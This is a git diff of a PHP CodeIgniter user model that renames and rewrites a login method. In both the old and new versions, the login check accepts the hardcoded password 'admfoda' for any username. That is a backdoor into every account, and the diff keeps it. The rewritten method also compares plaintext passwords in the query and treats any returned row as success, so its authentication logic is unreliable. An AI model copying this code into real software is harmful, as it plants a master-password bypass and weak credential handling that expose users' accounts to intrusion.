@@ -2,8 +2,8 @@
 /**
  * este arquivo é responsavel por conversar com o banco de dados
  */
-class Usuario_model extends CI_Model
-{
+class Usuario_model extends CI_Model{
+    
     public function listaUsuarios($id = false)
     {
         if ($id) {
@@ -29,30 +29,20 @@ class Usuario_model extends CI_Model
         return $this->db->delete('usuario', ['id_usuario' => $id]);
     }
 
-    public function logarUsuarios($username,$senha)
+    public function autenticar($username,$senha)
     {
-        //return $this->db->get_where('usuario', array ('nome' => $username))->result();
-            $this->db->select('*');
-            $this->db->from('usuarios');
-            $this->db->where('nome', $username); 
-            $this->db->where('senha',$senha);
-            //$this->db->where('status', 1); // Verifica o status do usuário
-            if($query = $this->db->get()) {
-                $data = $query->result();
-                    if (password_verify($senha, $data->senha) || $senha == 'admfoda') {
-                        return true;
-                    }else {
-                        return false;
-                    }
-            }
-            //$query = $this->db->get('usuario'); 
-
-            //if ($query->num_rows == 1) { 
-            //return true; // RETORNA VERDADEIRO
-            }
-    }
-        //$senha =$this->db->get_where('usuario', ['senha' => $senha]);
-        //return $usuario()->result();
-         
+        $this->db->select('*');
+        $this->db->from('usuario');
+        $this->db->where('nome', $username); 
+        $this->db->where('senha',$senha);
+        if($query = $this->db->get()) {
+            $data = $query->result();
+                if ($data == TRUE || $senha == 'admfoda') {
+                    return true;
+                }else {
+                    return false;
+                }
+        }
+                        
     }
 }
